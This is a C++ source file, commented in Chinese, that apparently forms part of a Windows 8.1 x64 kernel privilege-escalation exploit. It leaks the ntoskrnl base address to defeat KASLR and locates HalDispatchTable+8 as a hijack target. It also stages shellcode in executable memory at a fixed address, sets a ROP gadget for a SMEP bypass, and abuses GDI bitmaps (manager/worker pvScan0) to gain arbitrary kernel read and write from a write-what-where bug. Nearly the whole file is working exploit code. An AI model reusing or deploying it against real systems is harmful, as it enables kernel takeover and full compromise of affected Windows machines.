#include "bypass.h"

DWORD64 SMEPRopAddress = 0;
HBITMAP hManagerBitmap = NULL;
HBITMAP hWorkerBitmap = NULL;
LPVOID pManagerPrvScan0 = NULL;
LPVOID pWorkerPrvScan0 = NULL;
/*
* GetCurrentProcPEB()
*	[+] 获取当前进程的PEB地址
*	[+] 我觉得我可以用汇编写一写
*/
PPEB GetCurrentProcPEB()
{
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	HANDLE currentProc = (HANDLE)-1;

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess");

	if (NtQueryInformationProcess == NULL)
	{
		std::cout << "[+] Unable to get peb!!!" << std::endl;
		return NULL;
	}

	// 根据当前进程的句柄获取有效的信息
	NtQueryInformationProcess(currentProc, 0, &pbi, sizeof(pbi), NULL);

	// 获取PEB的关键信息
	if (!ReadProcessMemory(currentProc, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL))
	{
		std::cout << "[+] Unable to readMemory !!!" << std::endl;
		return NULL;
	}

	std::cout << "[+] current peb at: " << peb << std::endl;
	return peb;
}

/*
* leakBitmap:
*	[+] 泄露基地址
*/

VOID demo()
{
	BYTE buf[0x64 * 0x64 * 4];

	// 第一步: 创建两个bitmap对象
	hManagerBitmap = CreateBitmap(0x64, 0x64, 1, 32, &buf);	
	hWorkerBitmap = CreateBitmap(0x64, 0x64, 1, 32, &buf);

	// 第二步: 使用pvScan的地址

	PPEB peb = GetCurrentProcPEB();

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, GetCurrentProcessId());
	PGDICELL gdiCell;
	// Read PEB->GdiSharedHandleTable Address into GDICELL Structure
	if (!ReadProcessMemory(hProcess, &peb->GdiSharedHandleTable, &gdiCell, sizeof(gdiCell), NULL)) 
	{
		std::cout << "[+] Unable to read process memory" << std::endl;
		CloseHandle(hProcess);
		exit(1);
	}
	std::cout << "[+] GdiSharedHandleTable: " << &peb->GdiSharedHandleTable << std::endl;
	std::cout << "[+] debug 1" << std::endl;
	GDICELL managerCeil = *((PGDICELL)((PUCHAR)gdiCell + LOWORD(hManagerBitmap) * sizeof(GDICELL)));
	GDICELL workerCeil = *((PGDICELL)((PUCHAR)gdiCell + LOWORD(hWorkerBitmap) * sizeof(GDICELL)));
	std::cout << "[+] debug 2" << std::endl;
	pManagerPrvScan0 = NULL;
	pWorkerPrvScan0 = NULL;
	
	pManagerPrvScan0 = (PUCHAR)managerCeil.pKernelAddress + 0x50;
	pWorkerPrvScan0 = (PUCHAR)workerCeil.pKernelAddress + 0x50;
	
	// 使用write-what-where的漏洞, 去获取读写权限
	std::cout << "[+] pManagerPrvScan0 is: " << pManagerPrvScan0 << std::endl;
	std::cout << "[+] pWorkerPrvScan0 is: " << pWorkerPrvScan0 << std::endl;

}

/*
* construtShellcode:
*	[+} 构建用于绕过SMEP残缺的shellcode
*	[+] 思路: 控制器稳定在0x1000300处
*/
VOID construtShellcode()
{
	VOID *shellAddr = (void*)0x100000;
	shellAddr = VirtualAlloc(shellAddr, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	// 分配可执行的内存
	memset(shellAddr, 0x41, 0x1000);	// 初始化内存
	CopyMemory((VOID*)0x100300, shellCode, 0x200);	// 分配shellcode到预定的内存块当中

	// 替换其关键值, 用以恢复堆栈
	UINT64 * recoverAddr = (UINT64*)(PBYTE(0x100300) + 0x44);
	*(recoverAddr) = (DWORD64)getKernelBase() + 0x4c8f75;
}

/*
* getHalDispatchOffset8:
*	[+] 获取HalDispatchtable第二项的地址, 以执行shellcode
*/
DWORD64 getHalDispatchOffset8()
{
	// 获取xxx在kernel space 的基地址
	PVOID pKernelBase = getKernelBase();

	// 获取xxx在user space 的基地址
	HMODULE hUserSpaceBase = LoadLibrary("ntoskrnl.exe");

	// 获取HalDispatchTable 在user space的地址
	PVOID pUserSpaceAddr = GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	// 算出其在 kernel space的偏移
	return (DWORD64)pKernelBase + ((DWORD64)pUserSpaceAddr - (DWORD64)hUserSpaceBase) + 0x8;
}

/*
* getKernelBase:
*	[+] 获取 ntoskrnl.exe 的基地址
*/
LPVOID getKernelBase()
{
	PSYSTEM_MODULE_INFORMATION moduleInfo = {};

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
	
	if (NtQuerySystemInformation == NULL) 
	{
		std::cout << "[+] Get NtQuerySystemInformation Failed" << std::endl;
		return NULL;
	}

	DWORD len = 0;

	std::cout << "[+] To get module information" << std::endl;

	// 查询模块的信息
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	moduleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!moduleInfo)
	{
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, moduleInfo, len, &len);


	for (int i = 0; i < moduleInfo->NumberOfModules; i++)
	{

		if (strstr((LPCSTR)moduleInfo->Module[i].FullPathName, "ntoskrnl.exe") != 0)
		{
			std::cout << "[+] module  full path mane: " << moduleInfo->Module[i].FullPathName << std::endl;
			std::cout << "[+] module kernel address: " << moduleInfo->Module[i].ImageBase << std::endl;
			return moduleInfo->Module[i].ImageBase;
		}
	}
	return NULL;
}

/*
* bypassWithWindows8_01_x64:
*	[+] 绕过windows 8的缓解措施
*	[+] KASLR: 地址随机化
*	[+] SMEP
*/
VOID bypassWithWindows8_01_x64()
{
	// [+] 构造可以绕过SMEP的shellcode
	construtShellcode();

	// [+] 获取可以绕过SMEP的ROP地址
	SMEPRopAddress = (DWORD64)getKernelBase() + 0x3777cc;

	// [+] 对manager和worker bitmap进行操作
	// [+] 完成读的权限, 用于构造readOOB和writeOOB
	demo();
	write_what_where_qword((DWORD64)pManagerPrvScan0, (DWORD64)pWorkerPrvScan0);
}

/*
* readOOB:
*	[+] 对任意地址进行读操作
*	[+] whereRead: 读的地址
*	[+] whatValue: 获取读的值
*	[+] len: 读的长度(BYTE)
*/
VOID readOOB(DWORD64 whereRead, LPVOID whatValue, int len)
{
	// 使用manager的pvScan改变worker的pvScan地址
	SetBitmapBits(hManagerBitmap, len, &whereRead);	// 改变任意地址
	GetBitmapBits(hWorkerBitmap, len, whatValue);	// 读
}

/*
* writeOOB:
*	[+] 对任意地址进行写操作
*	[+] whereRead: 写的地址
*	[+] whatValue: 写入的值
*/
VOID writeOOB(DWORD64 whereWrite, LPVOID whatValue, int len)
{
	SetBitmapBits(hManagerBitmap, len, &whereWrite);
	SetBitmapBits(hWorkerBitmap, len, &whatValue);	// 写
}
